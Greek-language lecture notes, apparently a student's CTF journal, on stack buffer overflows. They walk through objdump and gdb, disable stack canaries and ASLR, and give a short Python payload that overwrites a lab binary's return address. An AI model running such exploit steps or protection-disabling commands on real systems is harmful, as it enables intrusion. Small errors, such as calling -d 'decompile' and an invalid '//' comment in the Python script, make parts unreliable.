# Εισαγωγή σε Buffer Overflow Attacks

## Διαλέξεις

- [Διάλεξη 1](https://delos.uoa.gr/opendelos/videolecture/show?rid=c9554f73)
- [Διάλεξη 2](https://delos.uoa.gr/opendelos/videolecture/show?rid=5ddddcb3)

## Περιεχόμενο

Στις παραπάνω διαλέξεις εξετάσαμε:

1. **Εισαγωγή στην x86 Assembly**: Μια σύντομη επισκόπηση της αρχιτεκτονικής και των βασικών εντολών.
2. **Ανάλυση προγραμμάτων μέσω εργαλείων**:
   - Χρήση του `objdump` για αποσυναρμολόγηση (disassembly) εκτελέσιμων αρχείων.
   - Χρήση του `gdb` για δυναμική ανάλυση και debugging.
3. **Εκμετάλλευση Buffer Overflow**:
   - Πώς μπορούμε να εκμεταλλευτούμε σφάλματα διαχείρισης μνήμης.
   - Επιθέσεις buffer overflow και τρόποι πρόκλησής τους.

Οι παραπάνω τεχνικές αποτελούν θεμελιώδεις αρχές στην ασφάλεια συστημάτων και την ανάλυση κακόβουλου λογισμικού.

---

## Εισαγωγή στο objdump και ανάλυση του buf0

Το `objdump` είναι ένα εργαλείο που μας επιτρέπει να αναλύσουμε το περιεχόμενο εκτελέσιμων αρχείων και να δούμε τη δομή τους. Η επιλογή `-d` στο `objdump` σημαίνει decompile και χρησιμοποιείται για την αποσυναρμολόγηση ενός εκτελέσιμου αρχείου.

Όταν χρησιμοποιούμε το `objdump -d buf0`, μπορούμε να βρούμε τη διεύθυνση της συνάρτησης `thank_you`. Ωστόσο, αυτές οι διευθύνσεις είναι relative προς τη βάση του εκτελέσιμου αρχείου και μπορεί να αλλάξουν κατά την εκτέλεση λόγω του ASLR (address space layout randomization).

Για να βρούμε τη σωστή διεύθυνση κατά την εκτέλεση του προγράμματος, πρέπει να χρησιμοποιήσουμε το `gdb`.

### Βήματα για να βρούμε τη σωστή διεύθυνση της συνάρτησης `thank_you`:

1. **Χρήση του `objdump`**:

   ```sh
   objdump -d buf0 | grep thank_you
   ```

   Αυτό θα επιστρέψει τη relative διεύθυνση της συνάρτησης στο εκτελέσιμο.

2. **Χρήση του `gdb` για να βρούμε τη πραγματική διεύθυνση**:

   ```sh
   gdb ./buf0
   break main
   run <όρισμα>
   info address thank_you
   ```

   Αυτή η εντολή θα επιστρέψει την πραγματική διεύθυνση της συνάρτησης στη μνήμη κατά την εκτέλεση του προγράμματος.

---

### Χρήσιμες Εντολές `gdb`

- Προβολή της τιμής στη διεύθυνση που δείχνει ο δείκτης στοίβας:

  ```sh
  x/x $rsp  # Για x86_64, προβολή 4 bytes (word)
  x/gx $rsp  # Για x86_64, προβολή 8 bytes (giant word)
  x/x $esp  # Για x86
  ```

  Η εντολή `x/x $rsp` θα εμφανίσει την τιμή στη διεύθυνση που δείχνει ο δείκτης στοίβας (stack pointer) ως word (4 bytes). Για να δείτε 8 bytes (64 bits), χρησιμοποιήστε την εντολή `x/gx $rsp`.

- Προβολή της τιμής ως string:

  ```sh
  x/s $rsp  # Για x86_64
  x/s $esp  # Για x86
  ```

- Προβολή των 5 πρώτων τιμών του δείκτη στοίβας:

  ```sh
  x/5x $rsp  # Για x86_64 ή x86
  ```

- Αν μία από αυτές τις τιμές είναι δείκτης σε string:

  ```sh
  x/s 0x7ffff7b0  # Αν 0x7ffff7b0 είναι διεύθυνση σε string
  ```

- Προβολή της εντολής που δείχνει ο δείκτης εντολών:

  ```sh
  x/i $rip  # Για x86_64
  x/i $eip  # Για x86
  ```

- Προβολή των επόμενων 5 εντολών από την τοποθεσία του δείκτη εντολών:

  ```sh
  x/5i $rip  # Για x86_64
  x/5i $eip  # Για x86
  ```

- Αποσυναρμολόγηση της συνάρτησης `main`:

  ```sh
  disas main
  ```

- Προβολή των περιοχών μνήμης του προγράμματος:

  ```sh
  info proc mappings
  ```

- Τοποθέτηση σημείου διακοπής σε συγκεκριμένη διεύθυνση:

  ```sh
  break *0xADDRESS
  ```

  Για παράδειγμα, αν θέλετε να τοποθετήσετε ένα σημείο διακοπής στη διεύθυνση `0x5555555551c5` μέσα στη συνάρτηση `thank_you`, χρησιμοποιήστε την εντολή:

  ```sh
  break *0x5555555551c5
  ```

---

## Απενεργοποίηση Μηχανισμών Προστασίας Στοίβας

Για να μπορέσει να τρέξει το παραπάνω exploit, θα χρεαστεί να απενεργοποιήσουμε κάποιους μηχανισμούς προστασίας στοίβας που χρησιμοποιεί το σύστημα μας όπως τα stack canaries και το ASLR.

### Απενεργοποίηση Stack Canaries

Επαναμεταγλωττίστε το ευάλωτο πρόγραμμα χωρίς προστασία στοίβας. Αν έχετε τον πηγαίο κώδικα, χρησιμοποιήστε την επιλογή `-fno-stack-protector` με το `gcc`:

```sh
gcc -fno-stack-protector -o vulnerable_program source_code.c
```

### Απενεργοποίηση ASLR

Προσωρινή απενεργοποίηση του ASLR:

```sh
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Για να επανενεργοποιήσετε το ASLR μετά την ολοκλήρωση, εκτελέστε:

```sh
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```

---

## Δημιουργία του Exploit

Για να δημιουργήσω το exploit, ακολούθησα τα παρακάτω βήματα:

1. **Ανάλυση της Στοίβας με το `gdb`**:

   - Έτρεξα το πρόγραμμα με `gdb` και τοποθέτησα ένα breakpoint μετά το `strcpy` στη συνάρτηση `print`.
   - Χρησιμοποίησα την εντολή `x/16gx $rsp` για να δω τις 16 τελευταίες μεγάλες λέξεις των 64 bytes που έχει αποθηκευμένη η στοίβα.

   ```sh
   gdb ./buf0
   break *print+20  # Breakpoint μετά το strcpy
   run <όρισμα>
   x/16gx $rsp
   ```

2. **Εύρεση του Offset**:

   - Τοποθέτησα επίτηδες την τιμή `0xffffffff` στο buffer για να δω γρήγορα πού αποθηκεύεται.
   - Χρησιμοποίησα την εντολή `disas main` για να βρω τη διεύθυνση της επόμενης εντολής μετά το `call`.
   - Υπολόγισα το offset από την αρχή του buffer μέχρι τη διεύθυνση επιστροφής.

3. **Δημιουργία του Payload**:

   - Δημιούργησα ένα Python script για τη δημιουργία του payload.

   ```python
   // filepath: /CTF-Journal/Notes/buffer_overflow/augerinos_lecture4/exploit.py
   import sys
   offset = b"AAAAAAAA" * 9
   buffer = offset + b"\xc9\x51\x55\x55\x55\x55\x00\x00"  # 0x5555555551c9

   sys.stdout.buffer.write(buffer)
   ```

4. **Εκτέλεση του Exploit**:

   - Έτρεξα το πρόγραμμα με το payload.

   ```sh
   python3 exploit.py > payload
   sudo ./buf0 $(cat payload)
   ```

Με αυτά τα βήματα, κατάφερα να εκμεταλλευτώ το buffer overflow και να εκτελέσω τη συνάρτηση `thank_you`, αποκτώντας root πρόσβαση.

---

## Συμπέρασμα

Αν και χρειάστηκε να απενεργοποιήσω μηχανισμούς προστασίας και να εκτελέσω το πρόγραμμα με δικαιώματα root, αυτή η άσκηση ήταν πολύτιμη για την κατανόηση των buffer overflow επιθέσεων. Μέσα από αυτή τη διαδικασία, έμαθα πώς να αναλύω τη μνήμη ενός προγράμματος, να βρίσκω ευπάθειες και να δημιουργώ exploits. Αυτές οι γνώσεις είναι θεμελιώδεις για την ασφάλεια συστημάτων και την ανάλυση κακόβουλου λογισμικού. Επιπλέον, η κατανόηση των μηχανισμών προστασίας και πώς να τους παρακάμπτουμε είναι κρίσιμη για την ανάπτυξη πιο ασφαλών συστημάτων στο μέλλον.
